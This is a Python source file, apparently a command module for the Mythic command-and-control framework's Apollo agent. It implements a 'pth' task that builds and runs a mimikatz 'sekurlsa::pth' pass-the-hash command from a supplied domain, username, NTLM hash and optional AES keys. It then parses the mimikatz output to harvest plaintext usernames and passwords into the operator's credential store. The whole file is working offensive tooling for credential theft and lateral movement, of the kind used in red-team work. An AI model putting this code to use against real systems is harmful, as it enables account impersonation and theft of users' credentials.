from operator import truediv
from mythic_payloadtype_container.MythicCommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from mythic_payloadtype_container.MythicRPC import *
import base64
import sys

class PthArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain", 
                type=ParameterType.String, 
                description="Domain associated with user.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True
                    )
                ]),
            CommandParameter(
                name="user",
                cli_name="User",
                display_name="User", 
                type=ParameterType.String, 
                description="Username associated with the NTLM hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=True
                    )
                ]),
            CommandParameter(
                name="ntlm",
                cli_name="NTLM",
                display_name="NTLM", 
                type=ParameterType.String, 
                description="User's NTLM hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=3,
                        required=True
                    )
                ]),
            CommandParameter(
                name="aes128",
                cli_name="AES128",
                display_name="AES128", 
                type=ParameterType.String, 
                description="AES128 key of user. Used for over pass the hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=4,
                        required=False
                    )
                ]),
            CommandParameter(
                name="aes256",
                cli_name="AES256",
                display_name="AES256", 
                type=ParameterType.String, 
                description="AES256 key of user. Used for over pass the hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=5,
                        required=False
                    )
                ]),
            CommandParameter(
                name="run",
                cli_name="Run",
                display_name="Program to Run", 
                type=ParameterType.String, 
                description="The process to launch under the specified credentials.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=6,
                        required=False
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="SavedCredentials",
                        ui_position=2
                    )
                ]),
        
            CommandParameter(
                name="credential",
                cli_name="Credential",
                display_name="Credential",
                type=ParameterType.Credential_JSON,
                description="Username and hash of the user to impersonate",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        group_name="SavedCredentials"
                    )
                ]),
        ]

    async def parse_arguments(self):
        if len(self.command_line) and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            username = ""
            domain = ""
            ntlm = ""
            aes128 = self.get_arg("aes128")
            aes256 = self.get_arg("aes256")
            run = self.get_arg("run")
            if self.get_arg("credential"):
                cred = self.get_arg("credential")
                username = cred["account"]
                domain = cred["realm"]
                ntlm = cred["credential"]
            else:
                username = self.get_arg("user")
                domain = self.get_arg("domain")
                ntlm = self.get_arg("ntlm")

            cmd = "sekurlsa::pth /domain:{} /user:{} /ntlm:{}".format(
                domain,
                username,
                ntlm
            )
            if aes128:
                cmd += " /aes128:{}".format(aes128)
            if aes256:
                cmd += " /aes256:{}".format(aes256)
            if run:
                if " " in run:
                    run = "\'{}\'".format(run)
                cmd += " /run:{}".format(run)
            cmd = "\\\"{}\\\"".format(cmd)

            self.add_arg("command", "mimikatz.exe {}".format(cmd), parameter_group_info=[ParameterGroupInfo(group_name=self.get_parameter_group_name())])
        else:
            raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(PthCommand.help_cmd))


class PthCommand(CommandBase):
    cmd = "pth"
    attributes=CommandAttributes(
        dependencies=["execute_pe"]
    )
    needs_admin = False
    help_cmd = "pth -Domain [domain] -User [user] -NTLM [ntlm] [-AES128 [aes128] -AES256 [aes256] -Run [cmd.exe]]"
    description = "Spawn a new process using the specified domain user's credential material."
    version = 3
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PthArguments
    attackmapping = ["T1550"]
    script_only = True

    async def parse_credentials(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
    #     get_responses(task_id: int) -> dict
    # For a given Task, get all of the user_output, artifacts, files, and credentials that task as created within Mythic
    # :param task_id: The TaskID you're interested in (i.e. task.id)
    # :return: A dictionary of the following format:
    # {
    #   "user_output": array of dictionaries where each dictionary is user_output message for the task,
    #   "artifacts": array of dictionaries where each dictionary is an artifact created for the task,
    #   "files": array of dictionaries where each dictionary is a file registered as part of the task,
    #   "credentials": array of dictionaries where each dictionary is a credential created as part of the task.
    # }
        response = await MythicRPC().execute("get_responses", task_id=subtask["id"])
        
        for output in response.response["user_output"]:
            
            mimikatz_out = output.get("response", "")
            comment = "{} from task {} on callback {}".format(
                        output["task"].get("original_params"),
                        output["task"].get("id"),
                        output["task"].get("callback"))
            if mimikatz_out != "":
                lines = mimikatz_out.split("\r\n")
                
                for i in range(len(lines)):
                    line = lines[i]
                    if "Username" in line:
                        # Check to see if Password is null
                        if i+2 >= len(lines):
                            break
                        uname = line.split(" : ")[1].strip()
                        realm = lines[i+1].split(" : ")[1].strip()
                        passwd = lines[i+2].split(" : ")[1].strip()
                        if passwd != "(null)":
                            cred_resp = await MythicRPC().execute(
                                "create_credential",
                                task_id=output["task"].get("id"),
                                credential_type="plaintext",
                                account=uname,
                                realm=realm,
                                credential=passwd,
                                comment=comment
                            )
                            if cred_resp.status != MythicStatus.Success:
                                raise Exception("Failed to register credential")
        return task

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                        command="execute_pe", params_string=task.args.get_arg("command"), subtask_callback_function="parse_credentials")
        return task

    async def process_response(self, response: AgentResponse):
        pass
